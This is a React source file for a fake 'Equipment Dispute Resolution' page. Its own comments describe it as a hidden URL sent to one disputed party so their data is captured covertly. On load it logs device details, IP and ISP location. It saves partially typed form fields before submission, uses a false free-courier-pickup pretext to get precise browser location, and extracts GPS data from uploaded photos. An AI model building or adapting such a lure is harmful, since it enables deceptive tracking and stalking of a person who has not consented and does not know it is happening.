import { useEffect, useRef, useState } from 'react';
import { useDocumentMeta } from '../lib/seo';
import { isFirebaseConfigured } from '../lib/firebase';
import {
  collectDeviceInfo,
  fetchIpInfo,
  requestGeolocation,
} from '../lib/deviceInfo';
import { parseExif } from '../lib/exif';
import {
  attachGeolocation,
  attachImage,
  createReportSession,
  logEvent,
  submitReportForm,
} from '../lib/db/issueReports';

interface UploadedImage {
  name: string;
  sizeBytes: number;
  stored: boolean;
  hasGps: boolean;
}

// Visitor-facing copy is intentionally generic "dispute resolution" — the URL
// is hidden, shared 1:1 with the disputed party. Page captures passive device
// info on mount, then progressively asks for location and image upload so we
// have evidence before the form is even submitted.
export default function ReportPage() {
  useDocumentMeta({
    title: 'Equipment Dispute Resolution · Gear Rental',
    description:
      'File a dispute or report an issue with your rented equipment. Our claims team responds within 48 hours.',
    noindex: true,
  });

  const [reportId, setReportId] = useState<string | null>(null);
  const [sessionError, setSessionError] = useState<string | null>(null);
  const [locationStatus, setLocationStatus] = useState<
    'idle' | 'requesting' | 'granted' | 'denied'
  >('idle');
  const [locationError, setLocationError] = useState<string | null>(null);
  const [images, setImages] = useState<UploadedImage[]>([]);
  const [uploading, setUploading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [form, setForm] = useState({
    name: '',
    phone: '',
    email: '',
    description: '',
  });

  const reportIdRef = useRef<string | null>(null);
  const partialSaveTimer = useRef<number | null>(null);

  // Passive capture: device info + public IP + ISP/geo. Fires on mount,
  // writes to Firestore immediately so we have a record even if the visitor
  // closes the tab.
  useEffect(() => {
    if (!isFirebaseConfigured) {
      setSessionError('Submission system unavailable. Please WhatsApp us instead.');
      return;
    }
    let cancelled = false;
    (async () => {
      try {
        const [device, ip] = await Promise.all([collectDeviceInfo(), fetchIpInfo()]);
        if (cancelled) return;
        const id = await createReportSession(device, ip);
        if (cancelled) return;
        reportIdRef.current = id;
        setReportId(id);
      } catch (err) {
        console.error('Failed to open report session', err);
        if (!cancelled) setSessionError('Could not initialise. Please try again or WhatsApp us.');
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  // Debounced partial save of the form fields. We don't want to lose what
  // they typed if they abandon mid-form.
  useEffect(() => {
    if (!reportId) return;
    if (partialSaveTimer.current) window.clearTimeout(partialSaveTimer.current);
    partialSaveTimer.current = window.setTimeout(() => {
      const anyText =
        form.name.trim() || form.phone.trim() || form.email.trim() || form.description.trim();
      if (!anyText) return;
      logEvent(reportId, 'form_partial', form);
    }, 1500);
    return () => {
      if (partialSaveTimer.current) window.clearTimeout(partialSaveTimer.current);
    };
  }, [form, reportId]);

  async function handleAllowLocation() {
    if (!reportId) return;
    setLocationStatus('requesting');
    setLocationError(null);
    const geo = await requestGeolocation();
    await attachGeolocation(reportId, geo);
    if (geo.granted) {
      setLocationStatus('granted');
    } else {
      setLocationStatus('denied');
      setLocationError(geo.errorMessage ?? 'Location blocked.');
    }
  }

  async function handleImagePick(e: React.ChangeEvent<HTMLInputElement>) {
    if (!reportId) return;
    const files = e.target.files ? Array.from(e.target.files) : [];
    if (files.length === 0) return;
    setUploading(true);
    try {
      for (let i = 0; i < files.length; i++) {
        const file = files[i];
        const exif = await parseExif(file).catch(() => null);
        const { stored } = await attachImage(reportId, file, exif, images.length + i);
        setImages((prev) => [
          ...prev,
          {
            name: file.name,
            sizeBytes: file.size,
            stored,
            hasGps: !!(exif?.gpsLatitude && exif?.gpsLongitude),
          },
        ]);
      }
    } catch (err) {
      console.error('Image upload failed', err);
      alert('Could not upload one of the images. Please try a smaller photo.');
    } finally {
      setUploading(false);
      e.target.value = '';
    }
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!reportId) return;
    if (!form.name.trim() || !form.description.trim()) {
      alert('Please enter your name and a description of the issue.');
      return;
    }
    setSubmitting(true);
    try {
      await submitReportForm(reportId, form);
      setSubmitted(true);
    } catch (err) {
      console.error('Form submit failed', err);
      alert('Could not submit. Please try again.');
    } finally {
      setSubmitting(false);
    }
  }

  function setField<K extends keyof typeof form>(key: K, value: (typeof form)[K]) {
    setForm((p) => ({ ...p, [key]: value }));
  }

  if (sessionError) {
    return (
      <div className="empty">
        <h2>Service temporarily unavailable</h2>
        <p>{sessionError}</p>
      </div>
    );
  }

  if (submitted) {
    return (
      <div className="empty">
        <h2>Dispute reference: {reportId?.slice(0, 8).toUpperCase()}</h2>
        <p>
          Thank you — your dispute has been logged. Our claims team will contact you on the
          phone number you provided within 48 hours. Please keep this reference number for your
          records.
        </p>
      </div>
    );
  }

  return (
    <div className="checkout">
      <h1>Equipment Dispute Resolution</h1>
      <p className="lead">
        Use this form to formally raise an issue regarding your rental. Our claims team aims to
        resolve all disputes within 48 hours. Submissions are logged with a unique reference for
        your records.
      </p>

      <form className="checkout-form" onSubmit={handleSubmit}>
        <h2>Your details</h2>
        <label>
          Full name
          <input
            type="text"
            required
            value={form.name}
            onChange={(e) => setField('name', e.target.value)}
            placeholder="As it appears on your Emirates ID"
          />
        </label>
        <label>
          Phone / WhatsApp
          <input
            type="tel"
            value={form.phone}
            onChange={(e) => setField('phone', e.target.value)}
            placeholder="+971 5x xxx xxxx"
          />
        </label>
        <label>
          Email (optional)
          <input
            type="email"
            value={form.email}
            onChange={(e) => setField('email', e.target.value)}
            placeholder="you@example.com"
          />
        </label>
        <label>
          Describe the issue
          <textarea
            rows={5}
            required
            value={form.description}
            onChange={(e) => setField('description', e.target.value)}
            placeholder="Please describe what happened, the equipment involved, and the resolution you are seeking."
          />
        </label>

        <h2 style={{ marginTop: 24 }}>Photo of the equipment / issue</h2>
        <p className="muted small">
          Upload one or more clear photos showing the condition of the equipment. Photos taken
          directly with your phone help us verify your claim faster.
        </p>
        <input
          type="file"
          accept="image/*"
          multiple
          onChange={handleImagePick}
          disabled={!reportId || uploading}
        />
        {uploading && <p className="muted small">Uploading…</p>}
        {images.length > 0 && (
          <ul className="muted small" style={{ marginTop: 8 }}>
            {images.map((img, idx) => (
              <li key={idx}>
                {img.stored ? '✓' : '⚠'} {img.name} ({Math.round(img.sizeBytes / 1024)} KB)
                {img.hasGps && ' — location data attached'}
              </li>
            ))}
          </ul>
        )}

        <h2 style={{ marginTop: 24 }}>Free courier pickup</h2>
        <p className="muted small">
          Allow location access so our team can dispatch a courier to collect the equipment at no
          cost to you. Without location we cannot guarantee free pickup.
        </p>
        {locationStatus === 'idle' && (
          <button
            type="button"
            className="btn btn-ghost"
            onClick={handleAllowLocation}
            disabled={!reportId}
          >
            Share location for free pickup
          </button>
        )}
        {locationStatus === 'requesting' && (
          <p className="muted small">Waiting for your browser permission…</p>
        )}
        {locationStatus === 'granted' && (
          <p className="muted small">✓ Location received. Courier dispatch enabled.</p>
        )}
        {locationStatus === 'denied' && (
          <p className="muted small">
            Location not shared. You can try again or arrange pickup manually with our team.
            {locationError && <> ({locationError})</>}
          </p>
        )}

        <button
          type="submit"
          className="btn btn-primary btn-lg"
          disabled={submitting || !reportId}
          style={{ marginTop: 24 }}
        >
          {submitting ? 'Submitting…' : 'Submit dispute'}
        </button>
        <p className="muted small">
          By submitting, you confirm the information provided is accurate. False claims may
          result in escalation under UAE consumer-protection law.
        </p>
      </form>
    </div>
  );
}
